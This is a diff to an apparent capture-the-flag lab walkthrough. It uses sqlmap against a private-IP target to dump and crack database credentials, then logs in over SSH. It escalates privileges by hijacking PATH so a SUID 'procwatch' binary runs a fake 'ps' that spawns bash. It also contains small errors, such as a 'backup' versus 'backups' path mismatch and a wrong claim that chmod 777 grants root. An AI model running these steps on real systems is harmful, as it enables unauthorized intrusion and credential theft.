@@ -107,6 +107,9 @@ $sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysq
 $sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T user -C User,Password --dump
 # Note that the command above will ask if you would like sqlmap to try and crack the passwords via a dictionary-based attack - select 'Y', then press enter to use the default password list.
 ```
+sqlmap returns:
+     * User: root | Password: sunnyvale
+     * User: phpmyadmin | sunnyvale
 
 ### 'seth' table
 
@@ -118,10 +121,66 @@ $sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth
 # Check what columns are in the 'users' table (from the 'seth database')
 $sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users --columns
 
-# Display User + Password from the 'users' table (from the 'seth' database)
-$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T users -C User,Password --dump
-# Note that the command above will ask if you would like sqlmap to try and crack the passwords via a dictionary-based attack - select 'Y', then press enter to use the default password list.
+# Display user + pass from the 'users' table (from the 'seth' database)
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users -C user,pass --dump
 ```
+sqlmap returns:
+     * user: ramses | pass: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE1
+     * You can use a website to decrypt this md5 password twice to get the password: omega
+
+## SSH
+
+One thing to quickly notice is that we now have the credentials for the */phpmyadmin/* page (root/sunnyvale). However, I wasn't able to find anything important here.
+
+So instead, let's try and use the credentials that we found from the 'seth' database to try and login via SSH:
+```bash
+# Notice we're using port 777
+$ssh ramses@192.168.132.88 -p 777
+```
+
+## Priviledge Escalation
+
+Now that we're in, we need to find a way to get root user.
+
+Check to see if anything is out of the ordinary:
+```bash
+$find / -perm -u=s -type f 2>/dev/null
+```
+
+Notice that there is something within the www directory called 'procwatch'. If we try to run it, the output looks similar to a cron job.
+```bash
+$/var/www/backup/procwatch
+```
+
+It seems that it is attempting to deploy ps, but unable to do so. Go to the directory and create a script that will launch a bash shell.
+```bash
+# Go to correct directory
+$ cd /var/www/backups
+
+# Create bash script and title it ps
+$ echo "/bin/bash" > ps
+
+# Add root privileges to the file
+$ chmod 777 ps
+```
+
+
+Now, let's check if this is just a script to run the *ps* command:
+```bash
+# env = list all environment variables | grep PATH = return line containing PATH
+env | grep PATH
+
+# Alternatively you can do
+echo $PATH
+```
+
+Update the PATH for environment variables:
+```bash
+# Essentially what this command does is add "." + $PATH
+export PATH=.:$PATH
+```
+
+Finally run `./procwatch`
 
 
 
